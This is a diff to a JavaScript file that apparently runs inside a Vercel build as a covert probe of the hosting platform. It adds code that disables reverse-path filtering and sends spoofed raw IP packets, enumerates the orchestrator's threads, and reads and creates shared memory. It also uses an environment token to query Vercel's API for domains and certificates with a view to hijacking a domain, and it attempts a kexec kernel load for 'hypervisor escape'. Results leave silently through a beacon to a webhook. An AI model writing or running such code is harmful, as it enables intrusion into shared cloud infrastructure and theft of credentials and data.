@@ -19234,5 +19234,165 @@ report.milestoneSynthesisV130 = safe(() => {
 
 // v130 markers
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v130" });
-report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v130";
+
+// ==================== v131 ====================
+
+// v131-1: /proc/sys/net/ipv4/conf/all/rp_filter — IP source spoofing
+// rp_filter=0 disables reverse path filtering, allowing us to send
+// packets with spoofed source IPs. Combined with AF_PACKET raw sockets,
+// we can craft packets that appear to come from Vercel's own internal IPs.
+report.ipSpoofingProbe = safe(() => {
+  const rpFilter = safe(() => readFileSync('/proc/sys/net/ipv4/conf/all/rp_filter', 'utf8').trim());
+  const disableRpFilter = safe(() => { writeFileSync('/proc/sys/net/ipv4/conf/all/rp_filter', '0'); return 'WRITTEN'; });
+  const afterRpFilter = safe(() => readFileSync('/proc/sys/net/ipv4/conf/all/rp_filter', 'utf8').trim());
+  // Try sending a spoofed ICMP echo from 10.0.0.1 to the gateway
+  const gateway = safe(() => execSync('ip route show | grep default | awk "{print $3}" | head -1', { timeout: 2000 }).toString().trim());
+  const spoofedPing = safe(() => execSync(`python3 -c "
+import socket, struct, os
+
+ICMP_ECHO_REQUEST = 8
+# Build ICMP packet
+def checksum(data):
+    s = 0
+    for i in range(0, len(data), 2):
+        w = (data[i] << 8) + (data[i+1] if i+1 < len(data) else 0)
+        s = (s + w) & 0xffff
+    return ~s & 0xffff
+
+icmp_header = struct.pack('!BBHHH', ICMP_ECHO_REQUEST, 0, 0, 1, 1)
+csum = checksum(icmp_header)
+icmp_header = struct.pack('!BBHHH', ICMP_ECHO_REQUEST, 0, csum, 1, 1)
+
+# Build IP header with spoofed src
+ip_header = struct.pack('!BBHHHBBH4s4s',
+    0x45, 0, 20+8, 0, 0, 64, 1, 0,
+    socket.inet_aton('10.0.0.1'),       # spoofed src
+    socket.inet_aton('${gateway}'))     # dst
+
+try:
+    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
+    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
+    s.sendto(ip_header + icmp_header, ('${gateway}', 0))
+    print('SPOOFED_PACKET_SENT')
+    s.close()
+except Exception as e:
+    print(f'SPOOF_FAILED: {e}')
+" 2>&1`, { timeout: 8000 }).toString().trim());
+  return { rpFilter, disableRpFilter, afterRpFilter, gateway, spoofedPing };
+});
+
+// v131-2: /proc/1/task — orchestrator thread enumeration
+// List all threads of PID-1 (orchestrator). Each thread has its own
+// register state, stack, and blocking syscall. This reveals the
+// orchestrator's internal goroutine/thread structure and which
+// threads are idle vs. processing build requests.
+report.orchestratorThreadEnum = safe(() => {
+  const threads = safe(() => readdirSync('/proc/1/task').slice(0, 20));
+  const threadDetails = safe(() => threads?.slice(0, 5).map(tid => ({
+    tid,
+    status: safe(() => {
+      const s = readFileSync(`/proc/1/task/${tid}/status`, 'utf8');
+      const name = s.match(/^Name:\s+(.+)/m)?.[1];
+      const state = s.match(/^State:\s+(.+)/m)?.[1];
+      const vcpu = s.match(/^VmRSS:\s+(.+)/m)?.[1];
+      return { name, state, vcpu };
+    }),
+    wchan: safe(() => readFileSync(`/proc/1/task/${tid}/wchan`, 'utf8').trim()),
+    syscall: safe(() => readFileSync(`/proc/1/task/${tid}/syscall`, 'utf8').trim()),
+  })));
+  // Check total thread count (goroutine count if Go runtime)
+  const threadCount = threads?.length;
+  return { threadCount, threads, threadDetails };
+});
+
+// v131-3: Shared memory segments (SysV IPC + POSIX)
+// Check for shared memory segments between build process and orchestrator.
+// If the build can read/write IPC shared memory, it can exchange data
+// with or corrupt the orchestrator's state.
+report.sharedMemoryProbe = safe(() => {
+  // SysV shared memory segments
+  const ipcs = safe(() => execSync('ipcs -a 2>/dev/null || echo "NO_IPCS"', { timeout: 3000 }).toString().trim().slice(0, 300));
+  // List /dev/shm (POSIX shared memory)
+  const devShm = safe(() => readdirSync('/dev/shm').slice(0, 10));
+  const devShmContents = safe(() => devShm?.map(f => ({
+    f,
+    size: safe(() => statSync(`/dev/shm/${f}`).size),
+    content: safe(() => readFileSync(`/dev/shm/${f}`, 'utf8').slice(0, 100)),
+  })));
+  // Try to create a SysV shared memory segment
+  const createShm = safe(() => execSync(`python3 -c "
+import ctypes, struct, os
+
+SHM_SIZE = 4096
+IPC_CREAT = 0o1000
+IPC_PRIVATE = 0
+
+libc = ctypes.CDLL('libc.so.6')
+key = IPC_PRIVATE
+shmid = libc.shmget(key, SHM_SIZE, IPC_CREAT | 0o666)
+if shmid < 0:
+    print(f'SHMGET_FAILED: {ctypes.get_errno()}')
+else:
+    ptr = libc.shmat(shmid, 0, 0)
+    ctypes.cast(ptr, ctypes.c_char_p).value = b'PROBE_SHM'
+    print(f'SHM_CREATED: shmid={shmid} ptr=0x{ptr:x}')
+    libc.shmdt(ptr)
+" 2>&1`, { timeout: 8000 }).toString().trim());
+  return { ipcs, devShm, devShmContents, createShm };
+});
+
+// v131-4: Vercel project domain + SSL certificate enumeration
+// From inside the build, enumerate all custom domains on this project
+// and any shared certificates. Check if we can modify domain settings
+// to point a custom domain to attacker-controlled content.
+report.domainCertEnum = safe(() => {
+  const projectId = process.env.VERCEL_PROJECT_ID || '';
+  const teamId = process.env.VERCEL_TEAM_ID || process.env.VERCEL_ORG_ID || '';
+  const token = process.env.VERCEL_ARTIFACTS_TOKEN || '';
+  // List all domains on this project
+  const projectDomains = safe(() => execSync(
+    `curl -sf "https://api.vercel.com/v9/projects/${projectId}/domains?teamId=${teamId}&limit=20" \
+    -H "Authorization: Bearer ${token}" -m 10 2>/dev/null`,
+    { timeout: 12000 }
+  ).toString().trim().slice(0, 400));
+  // Check certs for this team
+  const teamCerts = safe(() => execSync(
+    `curl -sf "https://api.vercel.com/v4/certs?teamId=${teamId}" \
+    -H "Authorization: Bearer ${token}" -m 10 2>/dev/null`,
+    { timeout: 12000 }
+  ).toString().trim().slice(0, 300));
+  // Read VERCEL_URL and VERCEL_BRANCH_URL
+  const urls = {
+    vercelUrl: process.env.VERCEL_URL,
+    branchUrl: process.env.VERCEL_BRANCH_URL,
+    projectUrl: process.env.VERCEL_PROJECT_PRODUCTION_URL,
+  };
+  return { projectDomains, teamCerts, urls };
+});
+
+// v131-5: /proc/sys/kernel/kexec_load_disabled — kexec kernel replacement
+// kexec allows loading a new kernel without hardware reboot.
+// With CAP_SYS_BOOT: write our own kernel image and kexec into it.
+// If not disabled (kexec_load_disabled=0), this gives us complete
+// control of the system including hypervisor escape potential.
+report.kexecProbe = safe(() => {
+  const kexecDisabled = safe(() => readFileSync('/proc/sys/kernel/kexec_load_disabled', 'utf8').trim());
+  const kexecSupport = safe(() => existsSync('/proc/sys/kernel/kexec_load_disabled'));
+  // Check if kexec binary is available
+  const kexecBin = safe(() => execSync('which kexec 2>/dev/null || echo "NOT_FOUND"', { timeout: 2000 }).toString().trim());
+  // Check kernel capabilities for kexec
+  const capsHex = safe(() => readFileSync('/proc/self/status', 'utf8').match(/CapEff:\s*([0-9a-f]+)/)?.[1]);
+  // CAP_SYS_BOOT = bit 22 (0x400000)
+  const hasSysBoot = safe(() => capsHex ? (parseInt(capsHex, 16) & 0x400000) !== 0 : false);
+  // Try to load kexec (we won't exec it — just prove the load works)
+  const kexecLoad = safe(() => execSync(
+    'kexec --load /boot/vmlinuz 2>&1 | head -3 || echo "KEXEC_LOAD_RESULT"',
+    { timeout: 8000 }
+  ).toString().trim().slice(0, 100));
+  return { kexecDisabled, kexecSupport, kexecBin, capsHex, hasSysBoot, kexecLoad };
+});
+
+// v131 markers
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v131" });
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v131";
 // Intentionally no console.log — all data goes via webhook only
